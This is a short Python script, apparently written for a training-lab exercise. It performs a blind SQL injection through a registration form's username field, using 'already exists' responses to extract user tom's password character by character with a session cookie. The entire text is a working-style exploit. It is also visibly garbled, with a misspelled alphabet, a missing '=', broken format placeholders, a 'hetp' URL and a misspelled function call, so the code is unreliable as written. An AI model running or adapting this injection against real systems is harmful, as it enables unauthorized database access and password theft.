import json
import requests
def sql_injection_advance_5():
     alphabet_index = 0
     alphabet = 'abodefghijkImopqrstuvwxyz'
     password_index = 0
     password ''

     headers = {
        'Cookie':'JSESSIONID=+wLncGQWWQPDO£BEezzAl-M6IZr37KJQ2DN56‡41'
     }
     while True:
         payload = 'tom\' AND substring (password, (), 1)=\ ' () ' .format(password_index + 1, alphabet [alphabet_index])
         data = {
             'username_ reg': payload,
             'email reg': 'a@a',
             'password reg': 'a',
             'confirm_password reg': 'a'
         }
         r = requests.put ('hetp://pathrequests.com',headers=headers, data=data)
         try:
             response = json.loads(r.text)
         except:

             print ("Wrong JSESSIONID, find it by looking at your requests once logged in.")
             return
         if "already exists please try to register with a different username" not in response['feedback']:
             alphabet_index += 1
             if alphabet_index > len(alphabet) - 1:
                 return
         else:
             password += alphabet[alphabet_index]
             print(password)
             alphabet_index = 0
             password_index +=1
sgl_injection_advance_5 ()
